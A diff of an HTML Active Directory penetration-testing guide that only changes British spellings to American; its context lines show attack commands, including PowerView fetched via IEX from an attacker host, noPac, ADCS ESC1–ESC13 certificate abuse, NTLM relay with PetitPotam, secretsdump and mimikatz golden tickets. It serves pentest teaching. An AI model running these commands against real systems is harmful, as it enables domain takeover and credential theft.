@@ -203,7 +203,7 @@
     sAMAccountName</code></pre>
 
 <h4 id="cape-ldap-anr">1.4.7 Ambiguous Name Resolution and PrimaryGroupID</h4>
-<p>Two AD-specific LDAP behaviours worth remembering. Ambiguous Name Resolution (ANR) matches a search value against multiple attributes at once (<code>givenName</code>, <code>sn</code>, <code>displayName</code>, <code>sAMAccountName</code>, <code>proxyAddresses</code>, and a handful of others), which is faster than composing an OR by hand:</p>
+<p>Two AD-specific LDAP behaviors worth remembering. Ambiguous Name Resolution (ANR) matches a search value against multiple attributes at once (<code>givenName</code>, <code>sn</code>, <code>displayName</code>, <code>sAMAccountName</code>, <code>proxyAddresses</code>, and a handful of others), which is faster than composing an OR by hand:</p>
 <pre><code class="language-bash">ldapsearch -x -b "dc=&lt;domain&gt;,dc=&lt;tld&gt;" -h &lt;dc-ip&gt; '(anr=admin)' sAMAccountName displayName</code></pre>
 <p><code>PrimaryGroupID</code> is where an account's primary group RID lives. It does not show up in <code>memberOf</code>, so the standard membership query misses it. To resolve the primary group, translate the RID into a group SID:</p>
 <pre><code class="language-bash"># Pull the primary group RID from the account
@@ -536,12 +536,12 @@ dsquery user -inactive 3</code></pre>
 <pre><code class="language-bash">./adalanche collect activedirectory --domain <domain.local> \
   --username <user>@<domain.local> --password '<password>' \
   --server <dc-fqdn> --tlsmode NoTLS --port 389 --authmode basic</code></pre>
-<p>Analyse in the browser:</p>
+<p>Analyze in the browser:</p>
 <pre><code class="language-bash">./adalanche analyze
 # then open http://127.0.0.1:8080</code></pre>
 
 <h3 id="cape-powerview-clixml">2.15 Exporting and Reusing Enumerated Objects</h3>
-<p>Freeze the enumeration for offline analysis using PowerShell's XML serialisation. <code>Export-Clixml</code> serialises whole objects, properties, methods, everything, to a portable XML file:</p>
+<p>Freeze the enumeration for offline analysis using PowerShell's XML serialization. <code>Export-Clixml</code> serializes whole objects, properties, methods, everything, to a portable XML file:</p>
 <pre><code class="language-powershell">Get-DomainUser | Export-Clixml .\DomainUsers.xml
 $DomainUsers = Import-Clixml .\DomainUsers.xml
 $DomainUsers | select name
@@ -549,7 +549,7 @@ $DomainUsers | ? {$_.name -match "admin"}</code></pre>
 
 <h3 id="cape-powerview-methodology">2.16 Methodology</h3>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-powerview-methodology-wf-0"> Load PowerView in-memory via <code>IEX</code> to avoid on-disk artefacts.
+<li><input type="checkbox" data-id="cape-powerview-methodology-wf-0"> Load PowerView in-memory via <code>IEX</code> to avoid on-disk artifacts.
 <pre><code class="language-powershell">IEX (New-Object Net.WebClient).DownloadString('http://&lt;attacker&gt;/PowerView.ps1')</code></pre>
 </li>
 <li><input type="checkbox" data-id="cape-powerview-methodology-wf-1"> Snapshot the environment.
@@ -664,7 +664,7 @@ neo4j console
 Bloodhound</code></pre>
 
 <h3 id="cape-bloodhound-editions">3.2 BloodHound Editions</h3>
-<p>Two flavours exist. <strong>BloodHound Enterprise</strong> is the SpecterOps SaaS platform aimed at defenders, continuous collection, attack-path management, and remediation guidance. <strong>BloodHound Community Edition (CE)</strong> is the free open-source client used by pentesters and red teams. CE is what you'll run in engagements; Enterprise is what customers deploy to defend themselves.</p>
+<p>Two flavors exist. <strong>BloodHound Enterprise</strong> is the SpecterOps SaaS platform aimed at defenders, continuous collection, attack-path management, and remediation guidance. <strong>BloodHound Community Edition (CE)</strong> is the free open-source client used by pentesters and red teams. CE is what you'll run in engagements; Enterprise is what customers deploy to defend themselves.</p>
 
 <h3 id="cape-bloodhound-collection-methods">3.3 SharpHound Collection Methods</h3>
 <p>Each SharpHound collection method targets a different data source. Picking the right combination for the engagement changes both the depth of the graph and the noise on the wire.</p>
@@ -731,7 +731,7 @@ MATCH p=(n)-[:GetChanges|GetChangesAll]-&gt;(d:Domain) RETURN p</code></pre>
 <p>Version mismatch between collector and client silently truncates data during ingest, always run matching versions.</p>
 
 <h3 id="cape-bloodhound-abusable-permissions">3.5 Abusable Permissions Overview</h3>
-<p>BloodHound's real value is visualising the graph of permissions that attackers can chain to escalate. A handful of edges are worth memorising:</p>
+<p>BloodHound's real value is visualizing the graph of permissions that attackers can chain to escalate. A handful of edges are worth memorizing:</p>
 <table class="custom-table">
 <thead><tr><th>Permission</th><th>Effect</th></tr></thead>
 <tbody>
@@ -843,7 +843,7 @@ Add-DomainGroupMember -Identity 'Domain Admins' -Members '<user>' -Credential $C
 <h3 id="cape-bloodhound-aces">3.17 Exploiting ACEs and Permission Delegations</h3>
 <p>Access Control Entries (ACEs) populate DACLs on nearly every AD object. Misconfiguration turns them into escalation paths. A classic example is IT Support holding <code>ForceChangePassword</code> over Domain Users. That is legitimate for helpdesk password resets, but it also lets a helpdesk operator reset a Domain Admin's password if the tiering is not enforced.</p>
 <p style="text-align:center;"><img src="./img/cape/acl-abuse-mindmap.png" alt="Mindmap of exploitable ACE types and their downstream primitives" style="max-width:85%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
-<p>Types of ACEs worth memorising:</p>
+<p>Types of ACEs worth memorizing:</p>
 <table class="custom-table">
 <thead><tr><th>ACE</th><th>Effect</th></tr></thead>
 <tbody>
@@ -884,7 +884,7 @@ python3 targetedKerberoast.py -v -d 'domain.local' --request-user <target-user> 
 john --format=krb5tgs --wordlist=rockyou.txt hashes.txt</code></pre>
 
 <h3 id="cape-bloodhound-readgmsapassword">3.22 Exploiting ReadGMSAPassword</h3>
-<p>Group Managed Service Accounts (GMSAs) have their passwords rotated automatically by DCs (see <code>msDS-ManagedPasswordInterval</code>). Any principal authorised to read <code>msDS-ManagedPassword</code> can retrieve the current secret and impersonate the GMSA:</p>
+<p>Group Managed Service Accounts (GMSAs) have their passwords rotated automatically by DCs (see <code>msDS-ManagedPasswordInterval</code>). Any principal authorized to read <code>msDS-ManagedPassword</code> can retrieve the current secret and impersonate the GMSA:</p>
 <pre><code class="language-bash">bloodyAD -d <domain.local> -u <user> -p hacked-password --host <dc-fqdn> get object 'ANSIBLE_DEV$' --attr msDS-ManagedPassword</code></pre>
 
 <h3 id="cape-bloodhound-auditing-acls">3.23 Auditing ACLs</h3>
@@ -1284,7 +1284,7 @@ mimikatz # kerberos::ptt ticket.kirbi</code></pre>
 <pre><code class="language-bash">ssh tunneluser@&lt;attacker&gt; -R 9050 -N
 proxychains &lt;tool&gt;</code></pre>
 </li>
-<li><input type="checkbox" data-id="cape-lateral-methodology-wf-8"> Clean up (delete services, unregister tasks, remove PSSessions), every artefact left is an IR lead.
+<li><input type="checkbox" data-id="cape-lateral-methodology-wf-8"> Clean up (delete services, unregister tasks, remove PSSessions), every artifact left is an IR lead.
 <pre><code class="language-bash">sc.exe \\TARGET stop evil
 sc.exe \\TARGET delete evil
 schtasks /S TARGET /TN "evil" /DELETE /F
@@ -1925,7 +1925,7 @@ nc -lvnp 389
 </ul>
 
 <h2 id="cape-dacl-1-7">7. DACL Attacks I</h2>
-<p>DACLs are the ACL layer on every Active Directory object. Each entry says what a specific principal is allowed or denied to do to that object, and misconfigured entries are the single most common escalation path I see on mature engagements. A legitimate delegation like "helpdesk can reset user passwords" often reaches further than the person who wrote it intended, and that gap is exactly what BloodHound's edges surface at a glance. GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, AddMembers, and AllExtendedRights each map to a specific set of primitives, and each shows up on real domains often enough to be worth memorising.</p>
+<p>DACLs are the ACL layer on every Active Directory object. Each entry says what a specific principal is allowed or denied to do to that object, and misconfigured entries are the single most common escalation path I see on mature engagements. A legitimate delegation like "helpdesk can reset user passwords" often reaches further than the person who wrote it intended, and that gap is exactly what BloodHound's edges surface at a glance. GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, AddMembers, and AllExtendedRights each map to a specific set of primitives, and each shows up on real domains often enough to be worth memorizing.</p>
 <p style="text-align:center;"><img src="./img/cape/dacl-ace-permissions.png" alt="Windows security editor showing DACL ACE permissions on an AD object" style="max-width:80%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 
 <h3 id="cape-dacl1-what-is-dacl">7.1 What is a DACL</h3>
@@ -1974,7 +1974,7 @@ Add-DomainGroupMember -Identity '&lt;target-group&gt;' -Members &lt;attacker-use
 <h3 id="cape-dacl1-methodology">7.7 Methodology</h3>
 <ul class="methodology-checklist">
 <li><input type="checkbox" data-id="cape-dacl1-methodology-wf-0"> Load BloodHound and identify Outbound Object Control edges from your foothold user.</li>
-<li><input type="checkbox" data-id="cape-dacl1-methodology-wf-1"> Prioritise short paths: GenericAll → group membership → next tier of access.</li>
+<li><input type="checkbox" data-id="cape-dacl1-methodology-wf-1"> Prioritize short paths: GenericAll → group membership → next tier of access.</li>
 <li><input type="checkbox" data-id="cape-dacl1-methodology-wf-2"> Request a Kerberos TGT with <code>getTGT.py</code> where LDAPS is required and NTLM is disabled.
 <pre><code class="language-bash">export KRB5CCNAME=/root/user.ccache
 getTGT.py 'domain.local/user:pass'</code></pre>
@@ -1996,7 +1996,7 @@ getTGT.py 'domain.local/user:pass'</code></pre>
 <p style="text-align:center;"><img src="./img/cape/dcsync-replication-rights.png" alt="DCSync replication rights delegated in Active Directory" style="max-width:80%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 
 <h3 id="cape-dacl2-dcom-excel">8.1 Exploiting AD with DCOM and Macro-Enabled Excel</h3>
-<p>Another artefact worth checking before any escalation attempt: legacy Group Policy Preferences (GPP) XML in SYSVOL. When it was still in fashion, admins would ship local account passwords through GPP, encrypted with a static key Microsoft later published. Any authenticated user could read the XML from SYSVOL and decrypt the <code>cpassword</code> field.</p>
+<p>Another artifact worth checking before any escalation attempt: legacy Group Policy Preferences (GPP) XML in SYSVOL. When it was still in fashion, admins would ship local account passwords through GPP, encrypted with a static key Microsoft later published. Any authenticated user could read the XML from SYSVOL and decrypt the <code>cpassword</code> field.</p>
 <p style="text-align:center;"><img src="./img/cape/gpp-cpassword-xml.png" alt="Groups.xml file in SYSVOL containing a cpassword field" style="max-width:75%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 <p>Requires admin on the compromised workstation. Craft an Excel file with a macro that spawns cmd.exe:</p>
 <pre><code class="language-vb">Sub AutoOpen()
@@ -2298,7 +2298,7 @@ $obj.Document.ActiveView.ExecuteShellCommand('cmd.exe', $null, '/c &lt;payload&g
 </ul>
 
 <h3 id="cape-dacl2-noPac">8.11 sAMAccountName Spoofing (noPac / CVE-2021-42278)</h3>
-<p>noPac chains two CVEs against unpatched DCs. CVE-2021-42278 lets an authenticated user rename a computer account whose <code>sAMAccountName</code> ends in <code>$</code>. CVE-2021-42287 lets a service ticket obtained under one name still be honoured after a rename, if the KDC cannot find the account and falls back to a <code>$</code>-appended lookup. Combined, the chain lets any authenticated user impersonate a Domain Controller.</p>
+<p>noPac chains two CVEs against unpatched DCs. CVE-2021-42278 lets an authenticated user rename a computer account whose <code>sAMAccountName</code> ends in <code>$</code>. CVE-2021-42287 lets a service ticket obtained under one name still be honored after a rename, if the KDC cannot find the account and falls back to a <code>$</code>-appended lookup. Combined, the chain lets any authenticated user impersonate a Domain Controller.</p>
 <p>The default abuse path uses <code>noPac.py</code> or the Impacket flow:</p>
 <pre><code class="language-bash"># One-shot exploit: creates a computer, renames it to a DC, S4U's for administrator
 python3 noPac.py -dc-ip &lt;dc-ip&gt; &lt;domain.local&gt;/&lt;user&gt;:'&lt;password&gt;' -impersonate administrator -use-ldap
@@ -2375,7 +2375,7 @@ copy payload.bat "\\&lt;dc-fqdn&gt;\SYSVOL\&lt;domain&gt;\Policies\{&lt;gpo-guid
 </ul>
 
 <h2 id="cape-adcs-9">9. ADCS Attacks</h2>
-<p>Active Directory Certificate Services (ADCS) is the CA that domains use to issue X.509 certificates for authentication, encryption, and signing. Its templates control who can enrol, for what purpose, and with which subject. When those templates drift, ADCS turns into one of the fastest paths to Domain Admin on Windows, catalogued as ESC1 through ESC15+ by the SpecterOps <em>Certified Pre-Owned</em> research. In practice, most environments running ADCS have at least one exploitable template, and Certipy will find it in under a minute.</p>
+<p>Active Directory Certificate Services (ADCS) is the CA that domains use to issue X.509 certificates for authentication, encryption, and signing. Its templates control who can enroll, for what purpose, and with which subject. When those templates drift, ADCS turns into one of the fastest paths to Domain Admin on Windows, cataloged as ESC1 through ESC15+ by the SpecterOps <em>Certified Pre-Owned</em> research. In practice, most environments running ADCS have at least one exploitable template, and Certipy will find it in under a minute.</p>
 <p style="text-align:center;"><img src="./img/cape/adcs-esc1-template.png" alt="ADCS ESC1 vulnerable certificate template configuration" style="max-width:80%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 
 <h3 id="cape-adcs-basics">9.1 Basics</h3>
@@ -2430,7 +2430,7 @@ certutil -CAInfo                           # Details on the current CA
 certutil -template                         # All published templates and their key flags
 certutil -view                             # Query issued and pending certificate requests</code></pre>
 <p>The template dump exposes the <code>msPKI-Certificate-Name-Flag</code> and <code>msPKI-Enrollment-Flag</code> values that drive the ESC classifications. The bit named <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> (0x1) inside <code>msPKI-Certificate-Name-Flag</code> is the ESC1 marker; <code>CT_FLAG_NO_SECURITY_EXTENSION</code> (0x80000) is the ESC9 marker.</p>
-<pre><code class="language-bash"># Example: request an on-target enrolment against a template
+<pre><code class="language-bash"># Example: request an on-target enrollment against a template
 certutil -attrib "SAN:upn=administrator@&lt;domain.local&gt;" -template "&lt;vulnerable-template&gt;" -config "&lt;ca-fqdn&gt;\&lt;ca-name&gt;" &lt;req.inf&gt; &lt;out.cer&gt;</code></pre>
 
 <h4 id="cape-adcs-check-certs">9.3.1 Checking for Installed Certificates</h4>
@@ -2462,7 +2462,7 @@ openssl pkcs12 -in cert.pfx -clcerts -nokeys -out cert.pem</code></pre>
 certipy req -u user@domain.local -p <password> -target dc.domain.local -template VulnTemplate -upn administrator@domain.local -ca 'domain-DC-CA'</code></pre>
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-adcs-esc1-wf-0"> Confirm the template has <code>ENROLLEE_SUPPLIES_SUBJECT</code>, Client Auth or Smart Card Logon EKU, and low-priv enrolment.
+<li><input type="checkbox" data-id="cape-adcs-esc1-wf-0"> Confirm the template has <code>ENROLLEE_SUPPLIES_SUBJECT</code>, Client Auth or Smart Card Logon EKU, and low-priv enrollment.
 <pre><code class="language-bash">certipy find -u user@domain.local -p pass -dc-ip &lt;dc-ip&gt; -template &lt;template-name&gt; -stdout</code></pre>
 </li>
 <li><input type="checkbox" data-id="cape-adcs-esc1-wf-1"> Request a certificate with <code>-upn administrator@&lt;domain&gt;</code> using <code>certipy req</code>.
@@ -2475,31 +2475,31 @@ certipy req -u user@domain.local -p <password> -target dc.domain.local -template
 
 <h4 id="cape-adcs-esc2">9.3.5 ESC2, Any Purpose EKU</h4>
 <p>ESC2 templates have <strong>Any Purpose</strong> (OID <code>2.5.29.37.0</code>) in their EKU list, or no EKU at all. Any Purpose implicitly allows Client Authentication, so a certificate issued under an ESC2 template can be used to authenticate to the domain even if the template was intended for something else. Enrollment rights are usually open to Domain Users, which turns this into an ESC1-style abuse without needing ENROLLEE_SUPPLIES_SUBJECT.</p>
-<pre><code class="language-bash"># Enrol against an ESC2 template: subject is fixed by the CA, but the cert works for PKINIT anyway
+<pre><code class="language-bash"># Enroll against an ESC2 template: subject is fixed by the CA, but the cert works for PKINIT anyway
 certipy req -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -target &lt;dc-fqdn&gt; -template &lt;esc2-template&gt; -ca '&lt;ca-name&gt;'</code></pre>
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
 <li><input type="checkbox" data-id="cape-adcs-esc2-wf-0"> Confirm the template's EKU list contains <code>Any Purpose</code> (OID <code>2.5.29.37.0</code>) or is empty.
 <pre><code class="language-bash">certipy find -u user@domain.local -p pass -dc-ip &lt;dc-ip&gt; -stdout | grep -A2 'Any Purpose'</code></pre>
 </li>
-<li><input type="checkbox" data-id="cape-adcs-esc2-wf-1"> Enrol as your current user; the CA fixes the subject but the certificate authenticates via PKINIT anyway.
+<li><input type="checkbox" data-id="cape-adcs-esc2-wf-1"> Enroll as your current user; the CA fixes the subject but the certificate authenticates via PKINIT anyway.
 <pre><code class="language-bash">certipy req -u user@domain.local -p pass -target dc.domain.local -template &lt;esc2-template&gt; -ca 'domain-DC-CA'</code></pre>
 </li>
 </ul>
 
 <h4 id="cape-adcs-esc3">9.3.6 ESC3, Certificate Request Agent</h4>
-<p>ESC3 relies on the <strong>Certificate Request Agent</strong> EKU. A template with that EKU lets an enrollee request certificates on behalf of other users. The chain is a two-step enrolment: first, enrol for the Certificate Request Agent template; second, use that agent cert to request a Client Authentication cert for a Domain Admin.</p>
-<pre><code class="language-bash"># Step 1: enrol for the agent template
+<p>ESC3 relies on the <strong>Certificate Request Agent</strong> EKU. A template with that EKU lets an enrollee request certificates on behalf of other users. The chain is a two-step enrollment: first, enroll for the Certificate Request Agent template; second, use that agent cert to request a Client Authentication cert for a Domain Admin.</p>
+<pre><code class="language-bash"># Step 1: enroll for the agent template
 certipy req -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -target &lt;dc-fqdn&gt; -template 'CertRequestAgent' -ca '&lt;ca-name&gt;'
 
 # Step 2: request a cert on behalf of a Domain Admin using the agent cert
 certipy req -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -target &lt;dc-fqdn&gt; -template 'User' -on-behalf-of '&lt;domain&gt;\administrator' -pfx agent.pfx -ca '&lt;ca-name&gt;'</code></pre>
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-adcs-esc3-wf-0"> Locate a template carrying the <code>Certificate Request Agent</code> EKU that Domain Users can enrol in.
+<li><input type="checkbox" data-id="cape-adcs-esc3-wf-0"> Locate a template carrying the <code>Certificate Request Agent</code> EKU that Domain Users can enroll in.
 <pre><code class="language-bash">certipy find -u user@domain.local -p pass -dc-ip &lt;dc-ip&gt; -stdout | grep -A2 'Certificate Request Agent'</code></pre>
 </li>
-<li><input type="checkbox" data-id="cape-adcs-esc3-wf-1"> Enrol for the agent template, then submit an <code>-on-behalf-of</code> request for a Domain Admin against a Client Auth template.
+<li><input type="checkbox" data-id="cape-adcs-esc3-wf-1"> Enroll for the agent template, then submit an <code>-on-behalf-of</code> request for a Domain Admin against a Client Auth template.
 <pre><code class="language-bash">certipy req -u user@domain.local -p pass -target dc.domain.local -template 'CertRequestAgent' -ca 'domain-DC-CA'
 certipy req -u user@domain.local -p pass -target dc.domain.local -template 'User' -on-behalf-of 'domain\administrator' -pfx agent.pfx -ca 'domain-DC-CA'</code></pre>
 </li>
@@ -2543,7 +2543,7 @@ bloodyAD --host &lt;dc-ip&gt; -u user -p pass -d domain.local add uac &lt;ca-obj
 </ul>
 
 <h4 id="cape-adcs-esc6">9.3.9 ESC6, EDITF_ATTRIBUTESUBJECTALTNAME2</h4>
-<p>The <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag on the CA lets any enrolment request specify an arbitrary Subject Alternative Name, regardless of the template. Any template that issues a Client Authentication cert becomes an ESC1 when this flag is set. It is disabled by default on modern CAs but still turns up on older environments.</p>
+<p>The <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag on the CA lets any enrollment request specify an arbitrary Subject Alternative Name, regardless of the template. Any template that issues a Client Authentication cert becomes an ESC1 when this flag is set. It is disabled by default on modern CAs but still turns up on older environments.</p>
 <pre><code class="language-bash"># certipy find flags this at the CA level
 certipy find -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -dc-ip &lt;dc-ip&gt; -vulnerable -stdout
 
@@ -2554,7 +2554,7 @@ certipy req -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -target &
 <li><input type="checkbox" data-id="cape-adcs-esc6-wf-0"> Confirm <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> is set on the CA (Certipy reports it in the CA info block).
 <pre><code class="language-bash">certipy find -u user@domain.local -p pass -dc-ip &lt;dc-ip&gt; -stdout | grep EDITF_ATTRIBUTESUBJECTALTNAME2</code></pre>
 </li>
-<li><input type="checkbox" data-id="cape-adcs-esc6-wf-1"> Enrol against any Client Authentication template with <code>-upn administrator@&lt;domain&gt;</code>.
+<li><input type="checkbox" data-id="cape-adcs-esc6-wf-1"> Enroll against any Client Authentication template with <code>-upn administrator@&lt;domain&gt;</code>.
 <pre><code class="language-bash">certipy req -u user@domain.local -p pass -target dc.domain.local -template 'User' -upn administrator@domain.local -ca 'domain-DC-CA'</code></pre>
 </li>
 </ul>
@@ -2585,7 +2585,7 @@ certipy ca -u user@domain.local -p pass -ca 'domain-DC-CA' -issue-request &lt;re
 
 <h4 id="cape-adcs-esc8">9.3.11 ESC8, Web Enrollment NTLM Relay</h4>
 <p>ADCS Web Enrollment (the <code>/certsrv/</code> HTTP endpoint) accepts NTLM authentication by default and does not enforce channel binding or HTTPS in many deployments. An attacker coerces a machine account (or a Domain Controller) to authenticate via a primitive like PetitPotam or DFSCoerce, relays that NTLM to <code>/certsrv/</code>, and receives a certificate for the coerced identity.</p>
-<pre><code class="language-bash"># 1. Start ntlmrelayx pointed at Web Enrolment with the DomainController template
+<pre><code class="language-bash"># 1. Start ntlmrelayx pointed at Web Enrollment with the DomainController template
 ntlmrelayx.py -t http://&lt;ca-fqdn&gt;/certsrv/certfnsh.asp --adcs --template DomainController
 
 # 2. Coerce a target (PetitPotam works against unpatched DCs)
@@ -2617,7 +2617,7 @@ certipy auth -pfx &lt;dc&gt;.pfx -dc-ip &lt;dc-ip&gt;</code></pre>
 # 1. Rewrite the sacrificial account's UPN to match the target
 certipy account -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -user &lt;sacrificial-user&gt; -upn administrator update
 
-# 2. Enrol for the ESC9 template as the sacrificial user
+# 2. Enroll for the ESC9 template as the sacrificial user
 certipy req -u &lt;sacrificial-user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -target &lt;dc-fqdn&gt; -template &lt;esc9-template&gt; -ca '&lt;ca-name&gt;'
 
 # 3. Revert the UPN
@@ -2630,7 +2630,7 @@ certipy auth -pfx &lt;sacrificial-user&gt;.pfx -domain &lt;domain.local&gt; -use
 <li><input type="checkbox" data-id="cape-adcs-esc9-wf-0"> Confirm the template has <code>CT_FLAG_NO_SECURITY_EXTENSION</code> and you hold <code>GenericWrite</code> over a sacrificial account.
 <pre><code class="language-bash">certipy find -u user@domain.local -p pass -dc-ip &lt;dc-ip&gt; -vulnerable -stdout | grep -A5 ESC9</code></pre>
 </li>
-<li><input type="checkbox" data-id="cape-adcs-esc9-wf-1"> Swap the sacrificial account's UPN to the target, enrol, revert the UPN, then authenticate.
+<li><input type="checkbox" data-id="cape-adcs-esc9-wf-1"> Swap the sacrificial account's UPN to the target, enroll, revert the UPN, then authenticate.
 <pre><code class="language-bash">certipy account -u user@domain.local -p pass -user &lt;sacrificial-user&gt; -upn administrator update
 certipy req -u &lt;sacrificial-user&gt;@domain.local -p pass -target dc.domain.local -template &lt;esc9-template&gt; -ca 'domain-DC-CA'
 certipy account -u user@domain.local -p pass -user &lt;sacrificial-user&gt; -upn &lt;sacrificial-user&gt;@domain.local update
@@ -2661,7 +2661,7 @@ certipy auth -pfx &lt;sacrificial-user&gt;.pfx -domain domain.local -username ad
 </ul>
 
 <h4 id="cape-adcs-esc11">9.3.14 ESC11, Relay to ICPR</h4>
-<p>ESC11 extends the ESC8 idea from HTTP Web Enrollment to the ICertPassage Remote Protocol (RPC) endpoint. When the CA's ICPR interface does not enforce packet-level integrity (<code>IF_ENFORCEENCRYPTICERTREQUEST</code> off), NTLM auth can be relayed to it and used to enrol certificates for the coerced identity.</p>
+<p>ESC11 extends the ESC8 idea from HTTP Web Enrollment to the ICertPassage Remote Protocol (RPC) endpoint. When the CA's ICPR interface does not enforce packet-level integrity (<code>IF_ENFORCEENCRYPTICERTREQUEST</code> off), NTLM auth can be relayed to it and used to enroll certificates for the coerced identity.</p>
 <pre><code class="language-bash"># ntlmrelayx supports ICPR directly
 ntlmrelayx.py -t rpc://&lt;ca-fqdn&gt; -rpc-mode ICPR -icpr-ca-name '&lt;ca-name&gt;' --adcs --template DomainController
 
@@ -2679,8 +2679,8 @@ python3 PetitPotam.py -u user -p pass -d domain.local &lt;attacker-ip&gt; &lt;ta
 </ul>
 
 <h4 id="cape-adcs-esc13">9.3.15 ESC13, OID Group Link</h4>
-<p>ESC13 exploits an Application Policy OID linked to a Universal Security Group. When a template's Application Policy OID resolves to a group, any principal authenticating with a certificate issued under that template is treated as a member of that group for the lifetime of the token. Compromise of enrolment rights on the linked template becomes group membership, without touching the group's actual members.</p>
-<pre><code class="language-bash"># Enrol for the ESC13 template: the resulting cert grants effective group membership
+<p>ESC13 exploits an Application Policy OID linked to a Universal Security Group. When a template's Application Policy OID resolves to a group, any principal authenticating with a certificate issued under that template is treated as a member of that group for the lifetime of the token. Compromise of enrollment rights on the linked template becomes group membership, without touching the group's actual members.</p>
+<pre><code class="language-bash"># Enroll for the ESC13 template: the resulting cert grants effective group membership
 certipy req -u &lt;user&gt;@&lt;domain.local&gt; -p '&lt;password&gt;' -target &lt;dc-fqdn&gt; -template &lt;esc13-template&gt; -ca '&lt;ca-name&gt;'
 certipy auth -pfx &lt;user&gt;.pfx -dc-ip &lt;dc-ip&gt;</code></pre>
 <h5>Methodology</h5>
@@ -2688,7 +2688,7 @@ certipy auth -pfx &lt;user&gt;.pfx -dc-ip &lt;dc-ip&gt;</code></pre>
 <li><input type="checkbox" data-id="cape-adcs-esc13-wf-0"> Identify a template whose Application Policy OID resolves to a Universal Security Group Certipy flags as ESC13.
 <pre><code class="language-bash">certipy find -u user@domain.local -p pass -dc-ip &lt;dc-ip&gt; -vulnerable -stdout | grep -A5 ESC13</code></pre>
 </li>
-<li><input type="checkbox" data-id="cape-adcs-esc13-wf-1"> Enrol against the template; the issued certificate grants effective membership in the linked group at authentication time.
+<li><input type="checkbox" data-id="cape-adcs-esc13-wf-1"> Enroll against the template; the issued certificate grants effective membership in the linked group at authentication time.
 <pre><code class="language-bash">certipy req -u user@domain.local -p pass -target dc.domain.local -template &lt;esc13-template&gt; -ca 'domain-DC-CA'
 certipy auth -pfx user.pfx -dc-ip &lt;dc-ip&gt;</code></pre>
 </li>
@@ -2751,7 +2751,7 @@ certipy auth -pfx administrator_forged.pfx -dc-ip &lt;dc-ip&gt;</code></pre>
 </ul>
 
 <h2 id="cape-ntlm-relay-10">10. NTLM Relay Attacks</h2>
-<p>NTLM has one property that keeps it interesting: it is coercible. If I can force a victim to authenticate to a machine I control, and signing is not enforced at the far end, I can relay that authentication verbatim to a third-party service and act as the victim there. Coercion primitives keep multiplying (PetitPotam, DFSCoerce, WebClient triggers, and older printer-bug flavours), and every new one extends the reach of relay against DCs, ADCS Web Enrollment, and any SMB target where signing was left off.</p>
+<p>NTLM has one property that keeps it interesting: it is coercible. If I can force a victim to authenticate to a machine I control, and signing is not enforced at the far end, I can relay that authentication verbatim to a third-party service and act as the victim there. Coercion primitives keep multiplying (PetitPotam, DFSCoerce, WebClient triggers, and older printer-bug flavors), and every new one extends the reach of relay against DCs, ADCS Web Enrollment, and any SMB target where signing was left off.</p>
 <p>Responder handles the poisoning half of the chain, ntlmrelayx handles the relay itself. The trick to running them together cleanly is turning off Responder's own SMB and HTTP listeners so ntlmrelayx can catch the traffic instead.</p>
 <p style="text-align:center;"><img src="./img/cape/ntlm-relay-attack.png" alt="NTLM relay attack flow from victim through attacker to target service" style="max-width:85%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 
@@ -2950,8 +2950,8 @@ secretsdump.py &lt;domain.local&gt;/&lt;low-priv-user&gt;:'&lt;password&gt;'@&lt
 </ul>
 
 <h3 id="cape-ntlm-certipy-relay">10.4a Certipy Relay Mode</h3>
-<p>Certipy ships with a built-in relay mode that combines the coercion, the relay to ADCS Web Enrolment or ICPR, and the certificate collection into a single command. It removes the two-terminal juggle of ntlmrelayx + coercer and reports the resulting PFX inline.</p>
-<pre><code class="language-bash"># Web Enrolment (ESC8) end-to-end
+<p>Certipy ships with a built-in relay mode that combines the coercion, the relay to ADCS Web Enrollment or ICPR, and the certificate collection into a single command. It removes the two-terminal juggle of ntlmrelayx + coercer and reports the resulting PFX inline.</p>
+<pre><code class="language-bash"># Web Enrollment (ESC8) end-to-end
 certipy relay -target http://&lt;ca-fqdn&gt; -template DomainController
 
 # ICPR (ESC11) end-to-end
@@ -3148,7 +3148,7 @@ EXECUTE('sp_configure "show advanced options", 1; RECONFIGURE; sp_configure "xp_
 
 <h3 id="cape-trust-sidhistory">11.4 SID History Injection Across Trust</h3>
 <p>Every account has a <code>sIDHistory</code> attribute holding SIDs the user carried across a migration. Windows adds every SID from the history into the access token at authentication time, which means an account carrying a Domain Admins SID from a trusted forest is effectively a Domain Admin there. When SID filtering is off or missing on a trust, injecting a foreign privileged SID into a compromised account's history grants persistence across the trust.</p>
-<p>The classic Golden Ticket variant embeds the foreign SID directly into the forged TGT via the <code>/sids</code> flag. The KDC will still honour it as long as SID filtering is off on the trust.</p>
+<p>The classic Golden Ticket variant embeds the foreign SID directly into the forged TGT via the <code>/sids</code> flag. The KDC will still honor it as long as SID filtering is off on the trust.</p>
 <pre><code class="language-bash">mimikatz # kerberos::golden /user:Administrator /domain:&lt;compromised.local&gt; /sid:&lt;compromised-sid&gt; /krbtgt:&lt;hash&gt; /sids:&lt;target-forest-enterprise-admins-sid&gt; /ptt</code></pre>
